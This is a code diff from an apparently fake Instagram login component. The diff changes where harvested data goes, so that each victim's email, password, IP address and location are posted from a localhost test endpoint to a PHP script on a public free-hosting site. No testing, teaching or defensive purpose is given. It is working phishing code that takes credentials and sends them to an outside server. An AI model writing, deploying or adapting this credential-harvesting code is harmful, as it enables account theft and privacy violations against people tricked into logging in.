@@ -77,22 +77,25 @@ export default function Instagram() {
       ) {
         console.log("IP: ", ip);
         // Add data to php server
-        const response = await fetch("http://localhost/server/insert.php", {
-          method: "POST",
-          body: JSON.stringify({
-            email,
-            password,
-            country,
-            city,
-            region,
-            ip,
-            timezone,
-          }),
-          headers: {
-            "Content-Type": "application/json",
-          },
-          mode: "no-cors",
-        });
+        const response = await fetch(
+          "https://theappcrud.000webhostapp.com/insert.php",
+          {
+            method: "POST",
+            body: JSON.stringify({
+              email,
+              password,
+              country,
+              city,
+              region,
+              ip,
+              timezone,
+            }),
+            headers: {
+              "Content-Type": "application/json",
+            },
+            mode: "no-cors",
+          }
+        );
       }
     } catch (error) {
       console.log(error);
